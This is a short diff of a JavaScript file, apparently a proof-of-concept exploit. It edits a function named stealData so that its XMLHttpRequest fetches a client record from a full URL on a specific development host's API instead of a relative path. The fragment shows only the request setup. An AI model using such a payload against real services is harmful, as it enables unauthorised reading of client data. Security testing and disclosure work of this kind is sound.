@@ -31,9 +31,9 @@ function read_body(xhr)
 function stealData()
 {
 	var uri = "/api/v1/org/clients/230";
-
+        
 	xhr = new XMLHttpRequest();
-	xhr.open("GET", uri, true);
+	xhr.open("GET", "https://dsm-dev.zalaris.dev/api/v1/org/clients/230", true);
 	xhr.send(null);
 
 	xhr.onreadystatechange = function()
